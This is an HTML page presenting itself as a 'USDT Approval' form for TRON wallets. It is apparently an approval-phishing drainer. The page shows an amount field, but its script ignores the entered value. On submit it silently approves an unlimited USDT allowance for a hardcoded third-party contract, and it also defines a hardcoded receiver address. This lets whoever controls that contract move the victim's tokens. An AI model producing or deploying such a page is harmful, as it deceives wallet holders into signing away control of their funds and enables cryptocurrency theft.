<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC20 Approval</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-web@1.0.3/dist/index.min.js"></script>
</head>
<body>
  <h2>USDT Approval</h2>

  <form id="approvalForm">
    <label for="wallet">Wallet Address:</label>
    <input type="text" id="wallet" readonly /><br /><br />

    <label for="amount">Amount:</label>
    <input type="number" id="amount" placeholder="Enter amount (auto set to unlimited)" required /><br /><br />

    <button type="submit">Next</button>
  </form>

  <script type="module">
    import TronWeb from "https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js";

    const CONTRACT_ADDRESS = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const receiverAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";

    const tronWeb = window.tronWeb;

    const waitForTronWeb = async () => {
      while (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      return window.tronWeb;
    };

    const approveUSDT = async () => {
      const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Max allowance

      const usdt = await tronWeb.contract().at(USDT_CONTRACT);
      const tx = await usdt.approve(CONTRACT_ADDRESS, amount).send({ feeLimit: 100_000_000 });
      return tx;
    };

    document.addEventListener("DOMContentLoaded", async () => {
      await waitForTronWeb();
      document.getElementById("wallet").value = tronWeb.defaultAddress.base58;

      const form = document.getElementById("approvalForm");
      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        try {
          const tx = await approveUSDT();
          alert("Approval transaction sent:\n" + tx);
        } catch (err) {
          alert("Approval failed:\n" + err.message);
        }
      });
    });
  </script>
</body>
</html>
